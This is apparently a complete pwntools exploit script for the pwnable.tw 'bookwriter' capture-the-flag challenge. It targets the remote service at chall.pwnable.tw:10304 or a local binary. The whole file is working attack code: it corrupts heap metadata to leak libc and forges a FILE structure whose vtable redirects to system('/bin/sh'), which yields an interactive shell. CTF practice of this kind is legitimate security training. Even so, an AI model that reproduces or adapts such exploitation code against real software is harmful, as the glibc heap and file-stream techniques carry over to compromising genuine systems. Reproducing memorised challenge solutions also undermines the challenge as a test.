#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('bookwriter_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*malloc

        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10304
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10304)
else:
    p = process([exe.path])


def in4():
    sa(b'Your choice :', b'4')

def add(size, content):
    sa(b'Your choice :', b'1')
    sna(b'Size of page :', size)
    sa(b'Content :', content)

def edit(idx, content):
    sa(b'Your choice :', b'3')
    sna(b'Index of page :', idx)
    sa(b'Content:', content)

def show(idx):
    sa(b'Your choice :', b'2')
    sna(b'Index of page :', idx)

GDB()
load =flat(
    b'w'*0x20,
    0, 0x210,
    0, 0x602080
)

sa(b'Author :', load)

add(0x18, b'a'*0x18)
edit(0, b'a'*0x18)
edit(0, b'a'*0x18 + p32(0xfe1))

add(0x1008, b'ahihi')

add(0x18, b'a'*8)
show(2)
ru(b'a'*8)
libc_leak = u64(r(6) + b'\0\0')
libc.address = libc_leak-0x3c4188
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

for i in range(5):
    add(0x18, f'{i}'.encode()*0x18)

edit(0, b'\0')

add(0x18, b'ashw?')

load = flat(
    p64(0x21)*30,
    0, 0xee1,
    libc_leak - 0x610, 0x602080
)

edit(0, load)

edit(0, b'\0')

load = flat(
    b'h'*0x8,
    libc.sym.system,
    libc.sym._IO_2_1_stdout_,

)

add(0x200, load)

io = FileStructure()

io.flags = 0x3b01010101010201
io._IO_read_ptr = b'/bin/sh\0'
io._lock = 0x602280

io.vtable = 0x602060

edit(0, bytes(io))

p.interactive()

